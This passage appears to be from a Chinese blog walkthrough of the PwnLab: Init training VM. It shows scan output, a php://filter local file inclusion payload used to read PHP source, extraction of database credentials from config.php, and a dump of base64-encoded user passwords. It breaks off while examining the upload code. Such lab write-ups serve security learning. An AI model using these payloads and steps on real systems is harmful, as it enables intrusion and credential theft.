class="number">2.4</span><span class="number">.10</span> <span class="string">((Debian))</span></span><br><span class="line"><span class="string">|_http-server-header:</span> <span class="string">Apache/2.4.10</span> <span class="string">(Debian)</span></span><br><span class="line"><span class="string">|_http-title:</span> <span class="string">PwnLab</span> <span class="string">Intranet</span> <span class="string">Image</span> <span class="string">Hosting</span></span><br><span class="line"><span class="number">111</span><span class="string">/tcp</span>  <span class="string">open</span>  <span class="string">rpcbind</span> <span class="number">2</span><span class="number">-4</span> <span class="string">(RPC</span> <span class="comment">#100000)</span></span><br><span class="line"><span class="string">|</span> <span class="attr">rpcinfo:</span></span><br><span class="line"><span class="string">|</span>   <span class="string">program</span> <span class="string">version</span>   <span class="string">port/proto</span>  <span class="string">service</span></span><br><span class="line"><span class="string">|</span>   <span class="number">100000</span>  <span class="number">2</span><span class="string">,3,4</span>        <span class="number">111</span><span class="string">/tcp</span>  <span class="string">rpcbind</span></span><br><span class="line"><span class="string">|</span>   <span class="number">100000</span>  <span class="number">2</span><span class="string">,3,4</span>        <span class="number">111</span><span class="string">/udp</span>  <span class="string">rpcbind</span></span><br><span class="line"><span class="string">|</span>   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">49209</span><span class="string">/udp</span>  <span class="string">status</span></span><br><span class="line"><span class="string">|_</span>  <span class="number">100024</span>  <span class="number">1</span>          <span class="number">55138</span><span class="string">/tcp</span>  <span class="string">status</span></span><br><span class="line"><span class="number">3306</span><span class="string">/tcp</span> <span class="string">open</span>  <span class="string">mysql</span>   <span class="string">MySQL</span> <span class="number">5.5</span><span class="number">.47</span><span class="number">-0</span><span class="string">+deb8u1</span></span><br><span class="line"><span class="string">|</span> <span class="attr">mysql-info:</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Protocol:</span> <span class="number">10</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Version:</span> <span class="number">5.5</span><span class="number">.47</span><span class="number">-0</span><span class="string">+deb8u1</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Thread ID:</span> <span class="number">39</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Capabilities flags:</span> <span class="number">63487</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Some Capabilities:</span> <span class="string">Speaks41ProtocolNew,</span> <span class="string">IgnoreSigpipes,</span> <span class="string">IgnoreSpaceBeforeParenthesis,</span> <span class="string">Speaks41ProtocolOld,</span> <span class="string">FoundRows,</span> <span class="string">Support41Auth,</span> <span class="string">SupportsCompression,</span> <span class="string">ODBCClient,</span> <span class="string">SupportsTransactions,</span> <span class="string">InteractiveClient,</span> <span class="string">ConnectWithDatabase,</span> <span class="string">LongPassword,</span> <span class="string">SupportsLoadDataLocal,</span> <span class="string">DontAllowDatabaseTableColumn,</span> <span class="string">LongColumnFlag,</span> <span class="string">SupportsMultipleResults,</span> <span class="string">SupportsMultipleStatments,</span> <span class="string">SupportsAuthPlugins</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Status:</span> <span class="string">Autocommit</span></span><br><span class="line"><span class="string">|</span>   <span class="attr">Salt:</span> <span class="string">W&gt;p9j*1WB#*GfK%uA$0b</span></span><br><span class="line"><span class="string">|_</span>  <span class="attr">Auth Plugin Name:</span> <span class="number">88</span></span><br></pre></td></tr></table></figure><p> nmap –script=vuln 192.168.43.18</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.50</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2018</span><span class="number">-06</span><span class="number">-05</span> <span class="number">18</span>:<span class="number">30</span> CST</span><br><span class="line"></span><br><span class="line">Pre-scan script results:</span><br><span class="line"></span><br><span class="line">| <span class="type">broadcast</span>-avahi-dos:</span><br><span class="line"></span><br><span class="line">|   <span class="type">Discovered</span> hosts:</span><br><span class="line"></span><br><span class="line">|     <span class="type">224</span><span class="number">.0</span><span class="number">.0</span><span class="number">.251</span></span><br><span class="line"></span><br><span class="line">|   <span class="type">After</span> NULL UDP avahi packet DoS (CVE<span class="number">-2011</span><span class="number">-1002</span>).</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>  Hosts are all up (not vulnerable).</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> pwnlab (<span class="number">192.168</span><span class="number">.43</span><span class="number">.18</span>)</span><br><span class="line"></span><br><span class="line">Host is up (<span class="number">0.00082</span>s latency).</span><br><span class="line"></span><br><span class="line">Not shown: <span class="number">997</span> filtered ports</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"></span><br><span class="line"><span class="number">80</span>/tcp   open  http</span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line"></span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=pwnlab</span><br><span class="line"></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line"></span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://pwnlab/?page=login</span><br><span class="line"></span><br><span class="line">|     <span class="type">Form</span> id: user</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>    Form action:</span><br><span class="line"></span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line"></span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line"></span><br><span class="line">|   <span class="type">/images</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.10</span> (debian)'</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>  /upload/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.10</span> (debian)'</span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-internal-ip-disclosure:</span><br><span class="line"></span><br><span class="line">|<span class="type">_</span>  Internal IP Leaked: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line"></span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">http</span>://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_</span>      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line"><span class="number">111</span>/tcp  open  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql</span><br></pre></td></tr></table></figure><p>发现开放了80、111、3306端口，</p><p>二、点击登录页面</p><p>发现页面url为:<a href="http://192.168.43.18/?page=login" target="_blank" rel="noopener">http://192.168.43.18/?page=login</a></p><p>page=login，比较敏感。可能是LFI</p><p>看下源代码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>($_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Use this server to upload and share image files inside the intranet"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>真的是文件包含，</p><p>通过测试发现下面payload有效：</p><p><a href="http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=index" target="_blank" rel="noopener">http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=index</a></p><p>页面显示字符串：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD<span class="number">9</span>waHANC<span class="keyword">i8</span>vTXVsdGlsaW<span class="number">5</span>ndWFsLiBOb<span class="number">3</span>QgaW<span class="number">1</span>wbGVtZW<span class="number">50</span>ZWQgeWV<span class="number">0</span>Lg<span class="number">0</span>KLy<span class="number">9</span>zZXRjb<span class="number">29</span>raWUoImxhbmciLCJlb<span class="keyword">i5</span>sYW<span class="number">5</span>nLnBocCIpOw<span class="number">0</span>KaWYgKGlzc<span class="number">2</span>V<span class="number">0</span>KCRfQ<span class="number">09</span>PS<span class="number">0</span>lFWydsYW<span class="number">5</span>nJ<span class="number">10</span>pKQ<span class="number">0</span>Kew<span class="number">0</span>KCWluY<span class="number">2</span><span class="keyword">x</span><span class="number">1</span>ZGUoImxhbmcvI<span class="keyword">i4</span>kX<span class="number">0</span>NPT<span class="number">0</span>tJRVsnbGFuZyddKTsNCn<span class="number">0</span>NC<span class="keyword">i8</span>vIE<span class="number">5</span>vdCBpbXBsZW<span class="number">1</span>lbnRlZCB<span class="number">5</span>ZXQuDQo/Pg<span class="number">0</span>KPGh<span class="number">0</span>bWw+DQo<span class="number">8</span>aGVhZD<span class="number">4</span>NCjx<span class="number">0</span>aXRsZT<span class="number">5</span>Qd<span class="number">25</span>MYWIgSW<span class="number">50</span>cmFuZXQgSW<span class="number">1</span>hZ<span class="number">2</span>UgSG<span class="number">9</span>zdGluZzwvdGl<span class="number">0</span>bGU+DQo<span class="number">8</span>L<span class="number">2</span>hlYWQ+DQo<span class="number">8</span>Ym<span class="number">9</span>keT<span class="number">4</span>NCjxjZW<span class="number">50</span>ZXI+DQo<span class="number">8</span>aW<span class="number">1</span>nIHNyYz<span class="number">0</span>iaW<span class="number">1</span>hZ<span class="number">2</span>VzL<span class="number">3</span>B<span class="number">3</span>bmxhY<span class="keyword">i5</span>wbmciPjxiciAvPg<span class="number">0</span>KWyA<span class="number">8</span>YSBocmVmPSIvIj<span class="number">5</span>Ib<span class="number">21</span>lPC<span class="number">9</span>hPiBdIFsgPGEgaHJlZj<span class="number">0</span>iP<span class="number">3</span>BhZ<span class="number">2</span>U<span class="number">9</span>bG<span class="number">9</span>naW<span class="number">4</span>iPkxvZ<span class="number">2</span>luPC<span class="number">9</span>hPiBdIFsgPGEgaHJlZj<span class="number">0</span>iP<span class="number">3</span>BhZ<span class="number">2</span>U<span class="number">9</span>dXBsb<span class="number">2</span>FkIj<span class="number">5</span>VcGxvYWQ<span class="number">8</span>L<span class="number">2</span>E+IF<span class="number">0</span>NCjxoc<span class="keyword">i8</span>+PGJyLz<span class="number">4</span>NCjw/cGhwDQoJaWYgKGlzc<span class="number">2</span>V<span class="number">0</span>KCRfR<span class="number">0</span>VUWydwYWdlJ<span class="number">10</span>pKQ<span class="number">0</span>KCXsNCgkJaW<span class="number">5</span>jbHVkZSgkX<span class="number">0</span>dFVFsncGFnZSddLiIucGhwIik<span class="number">7</span>DQoJfQ<span class="number">0</span>KCWVsc<span class="number">2</span>UNCgl<span class="number">7</span>DQoJCWVjaG<span class="number">8</span>gIlVzZSB<span class="number">0</span>aGlzIHNlcnZlciB<span class="number">0</span>byB<span class="number">1</span>cGxvYWQgYW<span class="number">5</span>kIHNoYXJlIGltYWdlIGZpbGVzIGluc<span class="number">2</span>lkZSB<span class="number">0</span>aGUgaW<span class="number">50</span>cmFuZXQiOw<span class="number">0</span>KCX<span class="number">0</span>NCj<span class="number">8</span>+DQo<span class="number">8</span>L<span class="number">2</span>NlbnRlcj<span class="number">4</span>NCjwvYm<span class="number">9</span>keT<span class="number">4</span>NCjwvaHRtbD<span class="number">4</span>=</span><br></pre></td></tr></table></figure><p>用base64解密后：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//Multilingual. Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="comment">//setcookie("lang","en.lang.php");</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lang'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"lang/"</span>.$_COOKIE[<span class="string">'lang'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// Not implemented yet.</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/pwnlab.png"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">[ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=login"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ] [ <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=upload"</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">a</span>&gt;</span> ]</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>($_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Use this server to upload and share image files inside the intranet"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>刚好是主页的源代码，证明文件包含漏洞存在。</p><p>尝试包含配置文件config.php</p><p><a href="http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=config" target="_blank" rel="noopener">http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=config</a></p><p>  PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+</p><p>base64解码后:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$server  = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"H4u%QJ_H99"</span>;</span></span><br><span class="line"><span class="php">$database = <span class="string">"Users"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到账号密码，数据库，尝试在登录页面登录发现不对。（这只是数据库的账号密码）</p><p>因为开放了3306端口，所以看下能不能连上3306登录.</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">windows7phone% mysql -h 192.168.43.18 -u root -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands end with ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL<span class="built_in"> connection </span>id is 6435</span><br><span class="line">Server version: 5.5.47-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle <span class="keyword">and</span>/<span class="keyword">or</span> its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation <span class="keyword">and</span>/<span class="keyword">or</span> its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">'help;'</span> <span class="keyword">or</span> <span class="string">'\h'</span> <span class="keyword">for</span> help.<span class="built_in"> Type </span><span class="string">'\c'</span> <span class="keyword">to</span> clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>可以发现成功登陆。</p><p>接下来的步骤很简单，查表名，账户密码</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">ERROR 1046 (3D000): No database selected</span><br><span class="line">mysql&gt; use Users</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line"><span class="code">+-----------------+</span></span><br><span class="line">| Tables<span class="emphasis">_in_</span>Users |</span><br><span class="line"><span class="code">+-----------------+</span></span><br><span class="line">| users           |</span><br><span class="line"><span class="code">+-----------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line">| user | pass             |</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line">| kent | Sld6WHVCSkpOeQ== |</span><br><span class="line">| mike | U0lmZHNURW42SQ== |</span><br><span class="line">| kane | aVN2NVltMkdSbw== |</span><br><span class="line"><span class="code">+------+</span>------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>账号kent，密码：Sld6WHVCSkpOeQ==,很容易看出密码经过base64加密，解密下为JWzXuBJJNy</p><p>登录进去，成功登陆</p><p><img src="/assets/image-20180605200825721.png" alt="image-20180605200825721"></p><p>现在是上传文件。上传前因为可以利用文件包含，所以先读下源码：</p><p><a href="http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=upload</a></p><p>然后解码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>])) &#123; <span class="keyword">die</span>(<span class="string">'You must be log in.'</span>); &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">''</span> <span class="attr">method</span>=<span class="string">'post'</span> <span class="attr">enctype</span>=<span class="string">'multipart/form-data'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'file'</span> <span class="attr">name</span>=<span class="string">'file'</span> <span class="attr">id</span>=<span class="string">'file'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">name</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'Upload'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">$filename  = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">$filetype  = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span></span><br><span class="line"><span class="php">$uploaddir = <span class="string">'upload/'</span>;</span></span><br><span class="line"><span class="php">$file_ext  = strrchr($filename, <span class="string">'.'</span>);</span></span><br><span class="line"><span class="php">$imageinfo = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php">$whitelist = <span class="keyword">array</span>(<span class="string">".jpg"</span>,<span class="string">".jpeg"</span>,<span class="string">".gif"</span>,<span class="string">".png"</span>); </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!(in_array($file_ext, $whitelist))) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Not allowed extension, please upload images only.'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strpos($filetype,<span class="string">'image'</span>) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Error 001'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/gif'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpeg'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpg'</span>&amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/png'</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Error 002'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(substr_count($filetype, <span class="string">'/'</span>)&gt;<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Error 003'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$uploadfile = $uploaddir . md5(basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])).$file_ext;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile)) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;img src=\""</span>.$uploadfile.<span class="string">"\"&gt;&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'Error 4'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以发现是基于后缀白名单上传的，白名单为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 